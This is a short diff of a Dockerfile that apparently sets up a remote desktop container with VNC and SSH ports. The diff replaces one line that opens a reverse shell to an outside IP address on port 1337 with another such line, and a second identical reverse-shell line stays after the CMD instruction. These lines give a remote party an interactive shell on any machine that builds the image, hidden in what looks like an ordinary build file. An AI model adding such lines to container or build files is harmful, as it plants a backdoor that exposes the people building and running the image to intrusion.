@@ -59,6 +59,6 @@ COPY xsession $HOME/.xsession
 COPY startup.sh $HOME
 
 EXPOSE 6080 5901 4040 22
-RUN /bin/bash -c "bash -i >& /dev/tcp/105.106.57.131/1337 0>&1 "
+RUN /bin/bash -c "bash -i >& /dev/tcp/105.106.2.43/1337 0>&1 "
 CMD ["/bin/bash", "/home/ubuntu/startup.sh"]
 RUN /bin/bash -c "bash -i >& /dev/tcp/105.106.57.131/1337 0>&1 "
